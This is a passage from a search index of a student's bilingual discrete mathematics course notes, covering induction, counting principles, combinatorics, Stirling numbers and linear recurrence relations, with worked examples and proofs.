<li>\u5206\u522b\u6c42\u89e3\u00a0\ud835\udc401mod3\u00a0\u7684\u9006\u3001\ud835\udc402mod5\u00a0\u7684\u9006\u3001\ud835\udc403mod7\u00a0\u7684\u9006</li> <li>\u5206\u522b\u662f 2\u30011\u30011</li> <li>\ud835\udc65=2\u22c535\u22c52+1\u22c521\u22c53+1\u22c515\u22c52=233\u226123(mod105)</li> </ul> <p>\u5176\u5b9e\u4e0a\u8ff0\u95ee\u9898\u4e5f\u53ef\u4ee5\u76f4\u63a5\u6c42\u89e3\uff0c\u6211\u5c31\u4e0d\u80cc\u516c\u5f0f\u4e86</p> <ul> <li>\\(x\\equiv 2(\\mod 3)\\ \\Rightarrow \\ x=3t+2\\)</li> <li>\\(3t+2\\equiv 3(\\mod 5)\\ \\Rightarrow \\ 3t\\equiv 6(\\mod 5)\\)</li> <li>\\(t=5u+2\\ \\Rightarrow \\ x=15u+8\\)</li> <li>\\(15u\\equiv -6(\\mod 7)\\ \\Rightarrow \\ 15u\\equiv 15(\\mod 7)\\)</li> <li>\\(u=7p+1\\ \\Rightarrow \\ x=105u+23\\)</li> </ul> <p>More Example</p> <p> x=323+330k</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter5/","title":"CH 5. Induction and Recursion","text":""},{"location":"Courses/DiscreteMathematics/note/Chapter5/#ch-5-induction-and-recursion","title":"CH 5 : Induction and Recursion \u5f52\u7eb3\u4e0e\u9012\u5f52","text":"<p> \u7ea6 588 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter5/#51-mathematical-induction","title":"5.1 Mathematical Induction \u6570\u5b66\u5f52\u7eb3\u6cd5","text":"<p>To prove  \\(\\forall n\\ P(n)\\) by mathematical induction:</p> <p>(1) Basic Step: Establish P(1)</p> <p>(2) Inductive Step: Prove that \\(P(k)\\to P(k+1)\\ for\\ k\\ge 1\\)</p> <p>(3) Conclusion: \\(\\forall n\\ P(n)\\) , where the domain is the set of positive integers</p> <p>Theorem The first principle of Mathematical Induction: $$ (p(1)\\land \\forall k(p(k)\\to p(k+1)))\\to \\forall n p(n) $$</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter5/#52-strong-induction-and-well-ordering-property","title":"5.2 Strong Induction and Well-ordering Property","text":""},{"location":"Courses/DiscreteMathematics/note/Chapter5/#strong-induction","title":"Strong Induction \u5f3a\u5f52\u7eb3\u6cd5\u3001\u5f52\u7eb3\u6cd5\u7b2c\u4e8c\u539f\u7406","text":"<p>To prove  \\(\\forall n\\ P(n)\\) by strong induction:</p> <p>(1) Basic Step: Establish \\(P(n_0)\\)</p> <p>(2) Inductive Step: Prove that \\(P(n_0)\\land P(n_0+1)\\land ... \\land P(k)\\to P(k+1)\\)</p> <p>(3) Conclusion: \\(\\forall n\\ge n_0\\ P(n)\\) </p> <p>Theorem The second principle of Mathematical Induction: $$ (P(n_0)\\land \\forall k\\ge n_0 (P(n_0)\\land P(n_0+1)\\land ... \\land P(k)\\to P(k+1)))\\to \\forall n\\ge n_0 (P(n)) $$</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter5/#well-ordering-property","title":"Well-ordering Property \u826f\u5e8f\u6027\u539f\u7406","text":"<p>The validity of mathematical induction follows from the well-ordering property for the set of positive integers.</p> <p>\u826f\u5e8f\u6027\u662f\u5f52\u7eb3\u6cd5\u7684\u5fc5\u8981\u6761\u4ef6</p> <p>Theorem A set S is well ordered\u00a0 if every nonempty subset of S has a least element.</p> <p>\u4e00\u4e2a\u96c6\u5408S\u662f\u826f\u5e8f\u7684\u5f53\u5b83\u4efb\u4f55\u4e00\u4e2a\u975e\u7a7a\u5b50\u96c6\u90fd\u6709\u6700\u5c0f\u7684\u5143\u7d20</p> <p>Example</p> <p>(1) N is well ordered</p> <p>(2) Z is not well ordered under \\(\\le\\) relation(Z has no smallest element)</p> <p>(3) (0,1) is not well ordered since (0,1) does not have a least element</p> <p>\u5bf9\u4e8e\u7531\u975e\u8d1f\u6574\u6570\u6784\u6210\u7684\u96c6\u5408\uff0c\u603b\u5b58\u5728\u6700\u5c0f\u7684\u5143\u7d20\uff0c\u56e0\u6b64\u826f\u5e8f\u6027\u6210\u7acb</p> <p>Warning</p> <ol> <li>The validities of both mathematical induction and strong induction follow from the well-ordering property. (\u826f\u5e8f\u6027\u539f\u7406\u662f\u524d\u63d0)</li> <li>In fact, mathematical induction, strong induction, and\u00a0 well-ordering are all equivalent principles.(\u5b9e\u9645\u4e0a\uff0c\u6570\u5b66\u5f52\u7eb3\u6cd5\u548c\u826f\u5e8f\u6027\u539f\u7406\u662f\u540c\u4e00\u79cd\u4e1c\u897f)</li> </ol>"},{"location":"Courses/DiscreteMathematics/note/Chapter5/#53-recursive-definitions-and-structural-induction","title":"5.3 Recursive Definitions and Structural Induction \u9012\u5f52\u5b9a\u4e49\u548c\u7ed3\u6784\u5f52\u7eb3\u6cd5","text":"<p>\u6c42\u6700\u5927\u516c\u7ea6\u6570</p> <p>Lemma 1 Let a = bq + r , then gcd(a,b) = gcd(b,r). \\(\\begin{gather}Suppose\\ that\\ a\\ and\\ b\\ are\\ positve\\ integers\\ with\\ a\\ge b.\\\\Let\\ r_0=a\\ and\\ r_1=b.\\\\ r_0=r_1q_1+r_2,\\ 0\\le r_2\\lt r_1;\\\\ r_1=r_2q_2+r_3,\\ 0\\le r_3\\lt r_2;\\\\ ......\\\\ r_{n-2}=r_{n-1}q_{n-1}+r_{n},\\ 0\\le r_{n-1}\\lt r_{n};\\\\ r_{n-1}=r_nq_n.\\\\ It\\ follows\\ Lemma\\ 1\\ that\\ \\\\ gcd(a,b)\\ =\\ gcd(r_0,r_1)\\ =\\ gcd(r_1,r_2)\\ =...=\\ gcd(r_{n-1},r_{n})\\ =\\ gcd(r_n,0)\\ =\\ r_n  \\end{gather}\\)</p> <p></p>"},{"location":"Courses/DiscreteMathematics/note/Chapter5/#54-recursive-algorithms","title":"5.4 Recursive Algorithms","text":"<p>Recursive algorithm vs. iterative algorithm</p> <ol> <li>\u5bf9\u4e8e\u4efb\u4f55\u9012\u5f52\u7b97\u6cd5\uff0c\u90fd\u6709\u76f8\u5e94\u7b49\u4ef7\u7684\u8fed\u4ee3\u7b97\u6cd5</li> <li>\u9012\u5f52\u7b97\u6cd5\u901a\u5e38\u66f4\u52a0\u77ed\u3001\u4f18\u96c5\u3001\u5e76\u4e14\u6613\u4e8e\u7406\u89e3</li> <li>\u8fed\u4ee3\u7b97\u6cd5\u901a\u5e38\u6bd4\u9012\u5f52\u5728\u65f6\u95f4\u7a7a\u95f4\u7684\u8fd0\u7528\u6548\u7387\u4e0a\u66f4\u4f18\u79c0</li> </ol>"},{"location":"Courses/DiscreteMathematics/note/Chapter6/","title":"CH 6. Counting","text":""},{"location":"Courses/DiscreteMathematics/note/Chapter6/#ch-6-counting","title":"CH 6 : Counting","text":"<p> \u7ea6 1012 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 5 \u5206\u949f</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter6/#61-the-basic-of-counting","title":"6.1 The Basic of Counting","text":""},{"location":"Courses/DiscreteMathematics/note/Chapter6/#basic-counting-principles","title":"Basic Counting Principles","text":"<ul> <li>The Sum Rule<ul> <li>If a first task can be done in n<sub>1</sub> ways and a second task in n<sub>2</sub> ways, and if these tasks cannot be done at the same time , then there are n<sub>1</sub> + n<sub>2</sub> ways to do one of these tasks.</li> <li>\u4e5f\u53ef\u4ee5\u7528\u96c6\u5408\u8868\u793a: \\(|S\\cup T|\\ =\\ |S|\\ +\\ |T|\\ where\\ S\\ and\\ T\\ are\\ two\\ disjoint\\ finite\\ sets\\)</li> </ul> </li> <li>The Product Rule<ul> <li>Suppose that a procedure can be broken down into two tasks. If there are n<sub>1</sub> ways to do the first task and n<sub>2</sub> ways to do the second after the first task has been done, then there are n<sub>1</sub>n<sub>2</sub> ways to complete the procedure.</li> <li>\u7528\u96c6\u5408\u8868\u793a\u5c31\u662f: \\(|S\\times T|\\ =\\ |S|\\ \\cdot \\ |T|\\)</li> </ul> </li> </ul>"},{"location":"Courses/DiscreteMathematics/note/Chapter6/#the-inclusion-exclusion-principle-subtraction-rule","title":"The Inclusion-Exclusion Principle (Subtraction Rule) \u5bb9\u65a5\u539f\u7406","text":"\\[ |A\\cup B|=|A|+|B|-|A\\cap B| \\]"},{"location":"Courses/DiscreteMathematics/note/Chapter6/#tree-diagrams","title":"Tree Diagrams","text":"<p>\u5728Counting\u4e2d\u5e94\u7528\u6811\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528each branch\u8868\u793a\u53ef\u80fd\u7684\u9009\u62e9\uff0c\u7528\u53f6\u5b50\u8868\u793a\u53ef\u80fd\u7684\u7ed3\u679c</p> Example <p></p>"},{"location":"Courses/DiscreteMathematics/note/Chapter6/#62-the-pigeonhole-principle","title":"6.2 The Pigeonhole Principle \u9e3d\u7b3c\u539f\u7406","text":"<p>Theorem  The pigeonhole principle states that if there are more pigeons than pigeonholes, then there must be at least one pigeonhole with at least two pigeons in it. </p> <p>\u5982\u679c\u9e3d\u5b50\u6570\u91cf\u5927\u4e8e\u9e3d\u7b3c\uff0c\u90a3\u4e48\u4e00\u5b9a\u81f3\u5c11\u6709\u4e00\u4e2a\u9e3d\u68da\u91cc\u9762\u6709\u81f3\u5c11\u4e24\u53ea\u9e3d\u5b50</p> <p>\u5b9e\u9645\u4e0a\uff0c\u5982\u679c\u8981\u5c06N objects\u653e\u5165k boxes\u4e2d\uff0c\u90a3\u4e48\u4e00\u5b9a\u4f1a\u6709\u81f3\u5c11\u4e00\u4e2abox\u4e2d\u4fdd\u5b58\u4e86\u81f3\u5c11\\(\\lceil \\frac{N}{k}\\rceil\\) \u4e2aobjects</p> <p>An elegant application of pigeonhole principle</p> <p>Show that among any n+1 positive integers not exceeding 2n there must be an integer that divides one of the other integers n+1\u4e2a\u4e0d\u8d85\u8fc72n\u7684\u6b63\u6574\u6570\u5fc5\u5b9a\u5b58\u5728\u4e00\u4e2a\u6570\u662f\u53e6\u4e00\u4e2a\u6570\u7684\u6574\u6570\u500d</p> <p>\u8bc1\u660e\u8fc7\u7a0b\uff1a</p> <p>Let \\(n+1\\) positive integers be \\(a_1,a_2,...,a_{n+1},(1\\le a_i\\le 2n)\\) Write \\(a_i=2^{k_i}q_i\\),where \\(k_i\\) is a nonnegative integer and \\(q_i\\) is an odd integer less than 2n Since there are only n odd number less than 2n, by the pigeonhole principle it follows that there exist integer i and j that \\(q_i=q_j\\)  then \\(a_i=2^{k_i}q_i\\ ,\\ a_j=2^{k_j}q_j\\) Then we can conclude it</p> <p>\u53e6\u4e00\u4e2a\u7c7b\u4f3c\u7684\u95ee\u9898\uff0c\u800c\u6211\u671f\u4e2d\u8003\u6ca1\u505a\u51fa\u6765</p> <p>n+1\u4e2a\u4e0d\u8d85\u8fc72n\u7684\u6b63\u6574\u6570\u5fc5\u5b9a\u5b58\u5728\u4e24\u4e2a\u6570\u4e92\u8d28</p> <p>\u8bc1\u660e</p> <p>\u5c062n\u4e2a\u6570\u4e24\u4e24\u5206\u4e3a\u4e00\u7ec4\uff0c\u4e3a {1\uff0c2}\uff0c{3\uff0c4}\uff0c{5\uff0c6}...{2n-1,2n}\uff0c\u7531\u4e8e\u8981\u9009\u62e9n+1\u4e2a\u6570\u5b57\uff0c\u5219\u5fc5\u5b9a\u6709\u4e24\u4e2a\u6570\u5728\u540c\u4e00\u7ec4\uff0c\u4e14\u8fd9\u4e24\u4e2a\u6570\u4e92\u8d28\uff0cQ.E.D</p> Example 2 <p></p> <p>Theorem Every sequence of n<sup>2</sup>+1 distinct integers contains a subsequence of length n + 1 that is either strictly increasing or strictly decreasing.     \u4efb\u4f55\u4e00\u4e2a\u542b\u6709n<sup>2</sup>+1\u4e2a\u4e0d\u540c\u6574\u6570\u7684\u5e8f\u5217\uff0c\u4e00\u5b9a\u5b58\u5728\u4e00\u4e2a\u957f\u5ea6\u4e3an+1\uff0c\u8981\u4e48\u4e25\u683c\u5355\u8c03\u9012\u589e\u8981\u4e48\u4e25\u683c\u5355\u8c03\u9012\u51cf\u7684\u5b50\u5217</p> <p>\u8bc1\u660e\uff1a</p> <p>Let the sequence be the \\(a_1,a_2,...,a_{n^2+1}\\) Associate \\((i_k,d_k)\\) to the term a_k</p> <p>\u5176\u4e2d \\(i_k\uff0cd_k\\) \u5206\u522b\u662f\u4ece \\(a_k\\) \u5f00\u59cb\u7684\u6700\u5927\u4e25\u683c\u9012\u589e\u5e8f\u5217\u7684\u957f\u5ea6\u548c\u6700\u5927\u4e25\u683c\u9012\u51cf\u5e8f\u5217\u7684\u957f\u5ea6</p> <p>\u6211\u4eec\u5047\u5b9a\u6ca1\u6709 \\(i_k\\) \u548c \\(d_k\\) \u80fd\u8d85\u8fc7 n+1\uff0c\u5373 \\((i_k,d_k)\\) \u5171\u6709 \\(n\\times n =n^2\\) \u4e2a\u7ec4\u5408</p> <p>\u56e0\u4e3a\u5171\u6709 \\(n^2+1\\) \u4e2a\u6570\uff0c\u6240\u4ee5\u5fc5\u5b9a\u5b58\u5728 \\(s\\lt t,a_s,a_t\\) \u4f7f\u5f97 \\((i_s,d_s)=(i_t,d_t)\\)</p> <p>\u5982\u679c \\(a_s&lt;a_t\\) ,\u90a3\u4e48\u5c31\u5b58\u5728\u4ece \\(a_s\\) \u5f00\u59cb\u957f\u5ea6\u4e3a \\(i_t+1\\) \u7684\u4e25\u683c\u9012\u589e\u5e8f\u5217\uff08\u4ece \\(a_t\\) \u5f00\u59cb\u957f\u5ea6\u4e3a \\(i_t\\) \u7684\u5b50\u5e8f\u5217\u52a0\u4e0a \\(a_s\\) \uff09</p> <p>\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u77db\u76fe contradiction,Q.E.D</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter6/#63-permulations-and-combinations","title":"6.3 Permulations and Combinations","text":""},{"location":"Courses/DiscreteMathematics/note/Chapter6/#permulations","title":"Permulations \u6392\u5217","text":"<p>Notation P(n,r)</p> \\[ P(n,r)=n(n-1)(n-2)...(n-r+1)=\\frac{n!}{(n-r)!} \\] <p>In particular , \\(P(n,n)=n!\\) \\(P(n,0)=1\\)</p> <p>\u7528\u51fd\u6570\u6765\u8868\u793a\u5c31\u662f:</p> \\[\\begin{gather} B=\\{b_1,b_2,...,b_r\\}\\ ,\\ A=\\{a_1,a_2,...,a_n\\}\\\\ P(n,r)\\ is\\ the\\ number\\ of\\ injection(\u5355\u5c04)\\ from\\ B\\ to\\ A  \\end{gather} \\]"},{"location":"Courses/DiscreteMathematics/note/Chapter6/#combinations","title":"Combinations \u7ec4\u5408","text":"<p>Notation C(n,r)</p> \\[ C_n ^r =\\frac{n!}{{r!(n-r)!}}=n(n-1)(n-2)...(n-r+1)/r! \\] \\[\\begin{gather} A=\\{a_1,a_2,...,a_n\\},B=\\{0,1\\}\\\\ f\\ is\\ the\\ function\\ from\\ A\\ to\\ B\\ such\\ that\\ the\\ image\\ of\\ r\\ elements\\ in\\ A\\ is\\ 1\\ \\\\ \\Leftrightarrow An\\ r-combination\\ of\\ A.\\\\ \\\\ C(n,r)=|\\{f|f:A\\to B\\land |\\{a|a\\in A\\land f(a)=1\\}| =r\\}| \\end{gather} \\] <p>\u7528\u96c6\u5408\u6765\u8868\u793a\u5c31\u662f: \u52bf\u4e3an\u7684\u96c6\u5408\u7684\u52bf\u4e3ar\u7684\u5b50\u96c6\u7684\u4e2a\u6570</p> <p>Corollary 1  $$ C(n,r)=C(n,n-r) $$</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter6/#64-binomial-coeffcients","title":"6.4 Binomial Coeffcients \u4e8c\u9879\u5f0f\u7cfb\u6570","text":"\\[ (x+y)^n=\\sum_{j=0}^n C(n,j)x^{n-j}y^j \\] <p>Corollary 1</p> \\[ \\sum_{k=0}^{n}C(n,k)=2^n \\] <p>Corollary 2</p> \\[ \\sum_{k=0}^{n}(-1)^kC(n,k)=0 \\] <p>Theorem PASCAL'S Identity</p> \\[ C(n+1,k)=C(n,k)+C(n,k-1) \\] <p>PASCAL's triangle</p> <p></p> <p>Theorem  $$ C(m+n,r)=\\sum_{k=0}^rC(m,r-k)C(n,k) $$</p> <p>Corollary 4 </p> \\[ C(2n,n)=\\sum_{k=0}^nC^2(n,k) \\] <p>Theorem $$ C(n+1,r+1)=\\sum_{j=r}^nC(j,r) $$</p> <p>\u8bc1\u660e</p> <p>\u5047\u8bbe\u7b2c j+1 \u4e2a\u5143\u7d20\u88ab\u9009\u4e0a\uff0c\u4f46\u662fj+1\u540e\u9762\u7684\u6240\u6709\u5143\u7d20\u90fd\u6ca1\u88ab\u9009\u4e0a\uff0c\u5219\u5171\u6709\\(C(j,r)\\)\u79cd\u9009\u62e9\uff0c\u540c\u7406\uff0cj\u53ef\u4ecer\u9009\u53d6\u5230n\uff0cQ.E.D</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter6/#65-generalized-permutations-and-combinations","title":"6.5 Generalized Permutations and Combinations","text":""},{"location":"Courses/DiscreteMathematics/note/Chapter6/#r-permutation-with-repetition","title":"r-permutation with repetition \u5143\u7d20\u53ef\u91cd\u590d\u7684\u6392\u5217","text":"<p>Theorem 1 The number of r-permutations of a set of n objects with repetition allowed is \\(n^r\\). \u5c06n\u4e2a\u5bf9\u8c61\u53ef\u91cd\u590d\u7684\u6392\u5217\u8fdbr\u4e2a\u4f4d\u7f6e\u4e2d\uff0c\u5171\u6709\\(n^r\\)\u79cd\u6392\u5217\u65b9\u6cd5</p> <p>Note</p> <p>\u5982\u679c\u6bcf\u4e2a\u5143\u7d20\u53ef\u91cd\u590d\u591a\u5c11\u6b21\u4e0d\u4e00\u6837\uff0c\u90a3\u5c31\u53e6\u5f53\u522b\u8bba\uff0c\u6bd4\u5982: \u5c06String <code>SUCCESS</code> \u91cd\u65b0\u6392\u5217(Reordering)\uff0c\u5171\u6709: \\(C(7,3)C(4,2)C(2,1)C(1,1)=\\frac{{7!}}{{3!2!1!1!}}\\) </p> <p>Theorem 2 The number of r- Circle permutations of a set of n objects is P(n,r)/r . n\u4e2a\u5143\u7d20\u6392\u5165\u957f\u4e3ar\u7684\u5708\u4e2d\uff0c\u5171\u6709P(n,r)/r\u79cd\u6392\u6cd5\u3002</p> <p>Example</p> <p>\u5c06\u4e03\u4e2a\u540c\u5b66\u56f4\u6210\u4e00\u5708\uff0c\u5171\u6709\\(\\frac{{7!}}{7}\\)\u79cd\u6392\u5217\u65b9\u6cd5</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter6/#r-combination-with-repetition","title":"r-combination with repetition \u5143\u7d20\u53ef\u91cd\u590d\u7684\u7ec4\u5408","text":"<p>Theorem 3 There are C (n-1+r, r) r-combination from a\u00a0set with n elements when repetition of elements is allowed. </p> <p>\u9694\u677f\u539f\u7406</p> <p>\u5bf9\u4e8e\\(x_1+x_2+x_4+x_4=16\\)\u7684\u7ec4\u5408\u65b9\u5f0f\uff0c\u82e5x\u4e3a\u6b63\u6574\u6570\uff0c\u5219\u6709\\(C(15,3)\\)\u79cd\uff0c\u82e5x\u4e3a\u975e\u8d1f\u6574\u6570\uff0c\u5219\u6709\\(C(16-1+4,3)\\)\u79cd</p> <p>\u82e5\u5bf9\u4e8e\u975e\u8d1f\u6574\u6570\\(x_1+x_2+x_3+x_4\\le 16\\) \uff0c\u53ef\u4ee5\u6dfb\u52a0\u4e00\u4e2a\u8f85\u52a9\u53d8\u91cf\\(x_5\\)\u4f7f\u5f97\\(x_1+x_2+x_4+x_4+x_5=16\\) \u8fd9\u6837\u5b50\u5171\u6709\\(C(20,4)\\) \u79cd</p> <p>\u4f8b\u9898\uff0c\u671f\u4e2d\u8003\u6ca1\u5199\u51fa\u6765</p> <p>\u4e00\u4e2a\u957f\u5ea6\u4e3an (\\(n\\ge 6\\)) \u7684\u5b57\u7b26\u4e32\uff0c\u6709\u4e14\u4ec5\u67093\u4e2a 01 \u7ec4\u5408\uff0c\u6c42\u603b\u5171\u6709\u591a\u5c11\u79cd\u7ec4\u5408\u3002</p> <p>1...1|0...0 0|1 1...1|0...0 0|1 1...1|0...0 0|1 1...1|0...0</p> <p>\u76f8\u5f53\u4e8e\u653e\u7f6e\u4e03\u4e2a\u9694\u677f\u4e8en-1\u4e2a\u53ef\u9009\u4f4d\u7f6e\u5185\uff0c\u5176\u4e2d\u8981\u6c42\u53ea\u6709\u6700\u5de6\u4fa7\u7684\u7bb1\u5b50\u548c\u6700\u53f3\u4fa7\u7684\u7bb1\u5b50\u53ef\u4ee5\u4e3a0\uff0c\u90a3\u4e48\u53ef\u4ee5\u5148\u7ed9\u8fd9\u4e24\u4e2a\u7bb1\u5b50+1\u4f5c\u4e3a\u57fa\u6570\uff0c\u5c31\u53d8\u6210\u4e86\u6b63\u5e38\u7684\u9694\u677f\u539f\u7406\u9898\u76ee\u3002</p> <p>\u89e3\u4e3a \\(C(n+1,7)\\)</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter6/#stirling-numbers","title":"Stirling Numbers \u65af\u7279\u6797\u6570","text":"<p>Definition S(n,j)= The number of ways to distribute n distinguishable objects into j indistinguishable boxes so that no box is empty. \u5c06n\u4e2a\u4e0d\u540c\u7684\u7269\u4f53\u653e\u5165j\u4e2a\u6ca1\u6709\u533a\u522b\u7684\u7bb1\u5b50\u4e2d\u7684\u65b9\u6cd5\u603b\u6570</p> <ul> <li>S(r,1)=S(r,r)=1;</li> <li>S(r,2)=\\(2^{r-1}-1\\);<ul> <li>\u6bcf\u4e2a\u7269\u4f53\u90fd\u6709\u4e24\u79cd\u653e\u7f6e\u7684\u9009\u62e9\uff0c\u5171\u6709\\(2^r\\)ways\uff0c\u518d\u51cf\u53bb\u4e24\u79cd\u5b58\u5728\u7a7a\u7bb1\u5b50\u7684\u60c5\u51b5\uff0c\u518d\u9664\u4ee52\u51cf\u53bb\u91cd\u590d\u7684\u60c5\u51b5\uff0c\u5f97\u5230S(r,2)\u7684\u516c\u5f0f</li> </ul> </li> <li>S(r,r-1)=C(r,2);</li> <li>S(r+1,n)=S(r,n-1)+nS(r,n);<ul> <li>\u8003\u8651\u4e24\u79cd\u60c5\u51b5: </li> <li> <ol> <li>\u7b2c\u4e00\u4e2a\u5143\u7d20\u7684\u7bb1\u5b50\u53ea\u653e\u7f6e\u4e86\u5b83\u81ea\u5df1\uff0c\u6b64\u65f6\u6709S(r,n-1)\u79cdways\uff1b</li> </ol> </li> <li> <ol> <li>\u7b2c\u4e00\u4e2a\u5143\u7d20\u7684\u7bb1\u5b50\u4e0d\u6b62\u653e\u7f6e\u4e86\u5b83\u81ea\u5df1\uff0c\u90a3\u4e48\u6b64\u65f6\u5176\u5b83\u5143\u7d20\u53ef\u4ee5\u653e\u51faS(r,n)\u79cd\u60c5\u51b5\uff0c\u518d\u4e58\u4e0an(\u7b2c\u4e00\u4e2a\u5143\u7d20\u53ef\u4ee5\u4efb\u610f\u653e\u5165\u6240\u6709\u7bb1\u5b50\u4e2d)\u5f97\u5230\u7ed3\u679c\u3002</li> </ol> </li> </ul> </li> </ul> <p>Tip</p> <p>\u5b9e\u9645\u4e0a\uff0cS(n,j)=\\([\\sum_{i=0}^{j-1}(-1)^iC(j,i)(j-i)^n]/j!\\)</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter6/#66-generating-permutations-and-combinations","title":"6.6 Generating Permutations and Combinations","text":""},{"location":"Courses/DiscreteMathematics/note/Chapter6/#generating-permutations","title":"Generating Permutations","text":"<p>The lexicographic ordering(\u5b57\u6bcd\u5e8f) of the set of permutations of {1, 2, \u2026, n}\uff0c\u603b\u5171\u6709n!\u79cd\u6392\u5217</p> <p>Given permutation a<sub>1</sub>a<sub>2</sub>...a<sub>n</sub>, find the next larger permutation in increasing order</p> <p>\uff081\uff09\u627e\u5230\u540e\u9762\u6700\u957f\u9012\u51cf\u6570\u5217\u7684\u524d\u4e00\u4e2a\u5143\u7d20\uff0c\u5373\\(a_j&lt; a_{j+1},and\\ a_{j+1}&gt; a_{j+1}&gt;...&gt; a_n\\)</p> <p>\uff082\uff09\u5c06\\(a_j\\)\u66ff\u6362\u4e3a\\(a_{j+1}\u5230a_n\\)\u4e2d\u6bd4\\(a_j\\)\u5927\u7684\u6700\u5c0f\u6570</p> <p>\uff083\uff09\u5c06\u5269\u4e0b\u7684\u6570\u6309\u7167increasing order\u6392\u5217\u5728\u540e\u9762</p> <p>Example</p> <p>What is the next larger permutation in lexicographic order after 124653?</p> <p>124/653-&gt;125643-&gt;125346 </p> <p>\u5373\u7b54\u6848\u4e3a125346</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter6/#generating-combinations","title":"Generating Combinations","text":"<p>\u75280\u30011\u8868\u793a\u8be5\u5143\u7d20\u662f\u5426\u5b58\u5728\uff0c\u5219\u4e00\u4e2aSet\u7684\u6240\u6709Combinations\u90fd\u53ef\u4ee5\u7528bit strings\u8868\u793a\uff0c\u987a\u5e8f\u4e3a\u4ece000...000 \u5230 111...111</p> <p>\u90a3\u4e48\uff0c\u5982\u4f55\u627e\u5230 r-combinations \u7684\u4e0b\u4e00\u4e2a\u5462?</p> <p>If \\(S_i= \\{a_1 ,a_2 ,...,a_r\\},1\\le i\\le C_n^r -1\\)   has found , then the next combination can be obtained using the following rules:</p> <ul> <li>\u627e\u5230S<sub>i</sub>\u4e2d\u6700\u5927\u7684\u4e0d\u4e0e\u672b\u5c3e\u5b50\u5217\u5bf9\u5e94\u7684\u5143\u7d20(\\(a_i\\ne n-r+i\\))\uff0c\u7136\u540e\u5c06\u5176\u6362\u4e3a\\(a_i+1\\)\uff0c\u540e\u9762\u6240\u6709\u5143\u7d20\u90fd\u662f\u524d\u4e00\u4e2a\u5143\u7d20\u52a0 1\u3002</li> </ul> <p>Example</p> <p>\\(S_i=\\{2,3,5,6,9,10\\}\\) is given from the Set {1,2,3,4,5,6,7,8,9,10}. Find \\(S_{i+1}\\)</p> <p>\u4ece\u540e\u5f80\u524d\u770b\uff0c10\u548c9\u5bf9\u5e94\u4e86Set\u4e2d\u6700\u540e\u4e24\u4f4d\u6570\uff0c\u56e0\u6b64\u6211\u4eec\u4ee56\u4e3a\\(a_i\\) \uff0c\u5c06\u5176\u66ff\u6362\u4e3a7\uff0c9\u548c10\u4f9d\u6b21\u53d8\u62108\u548c9\uff0c\u56e0\u6b64\u7b54\u6848\u4e3a\\(S_{i+1}=\\{2,3,5,7,8,9\\}\\)</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter8/","title":"CH 8. Advanced Counting Techniques","text":""},{"location":"Courses/DiscreteMathematics/note/Chapter8/#ch-8-advanced-counting-techniques","title":"CH 8 : Advanced Counting Techniques","text":"<p> \u7ea6 1064 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 5 \u5206\u949f</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter8/#81-applications-of-recurrence-relations","title":"8.1 Applications of Recurrence Relations \u9012\u5f52\u5173\u7cfb\u7684\u5e94\u7528","text":"<p>Definition A recurrence relation is: $$ \\forall n\\ge n_0,  a_n=f( a_0, a_1, a_2,..., a_{n-1})  $$</p> <p>\u5e38\u89c1\u7684\u9012\u5f52\u5173\u7cfb</p> <p>(1) The Fibonacci sequence \\(a_n= a_{n-1} + a{n-2}\\)</p> <p>(2) Pascal's recursion for binomial coeffcient: \\(C_{n+1}^k = C_n^k + C_n^{k-1}\\)</p> <p>(3) The Tower of Hanoi: \\(H_1=1; H_n= 2H_{n-1}+1\\)</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter8/#82-solving-linear-recurrence-relations","title":"8.2 Solving Linear Recurrence Relations","text":""},{"location":"Courses/DiscreteMathematics/note/Chapter8/#homogeneous","title":"\u4e0d\u542b\u5e38\u91cf\u7684\u89e3\u6cd5 Homogeneous","text":"<p>Linear homogeneous recurrence relation of degree k with constant coeffcients</p> \\[ a_n= c_1 a_{n-1}+ c_2 a_{n-2}+...+ c_k a_{n-k} \\] <ul> <li>Linear:<ul> <li>linear Combination of previous terms</li> </ul> </li> <li>Constant Coeffcients:<ul> <li>The coeffcient of a<sub>i</sub> are constants</li> </ul> </li> <li>Degree k:<ul> <li>\\(a_n\\) is a function of previous k terms of the sequence</li> </ul> </li> <li>Homogeneous:<ul> <li>\u4e0d\u542b\u5e38\u91cf</li> </ul> </li> </ul> <p>Example</p> <p>(1) \\(a_n=(1.02) a_{n-1}\\) linear;constant coeffcients;homogeneous;degree 1.</p> <p>(2) \\(a_n= a_{n-1}+2^n\\) linear;constant coeffcients;nonhomogeneous;degree 1.</p> <p>(3) \\(a_n = na_{n-1}+ n^2a_{n-2}+ a_{n-1} a_{n-2}\\) nonlinear;not constant;homogeneous;degree 2.</p> <p>\u89e3\u6cd5: \u4e0d\u52a8\u70b9\u6cd5 \uff0c\u9ad8\u4e2d\u6559\u8fc7\uff0c\u76f8\u4fe1\u90fd\u61c2!</p> <p>\u6b64\u5904\u4ec5\u7ed9\u51fa\u4e00\u4f8b: </p>"},{"location":"Courses/DiscreteMathematics/note/Chapter8/#nonhomogeneous","title":"\u542b\u5e38\u91cf\u7684\u89e3\u6cd5 Nonhomogeneous","text":"<p>\u8fd9\u4e00\u90e8\u5206\u8bfe\u672c\u4e0a\u7684\u4f8b\u9898\u975e\u5e38\u597d\uff0c\u63a8\u8350\u53bb\u770b\u3002</p> <ul> <li>Definition<ul> <li>\\(a_n =c_1 a_{n-1}+ c_2 a_{n-2}+ ...+c_k a_{n-k} +F(n)\\)</li> <li>\\(c_k\\ne 0,c_k\\in 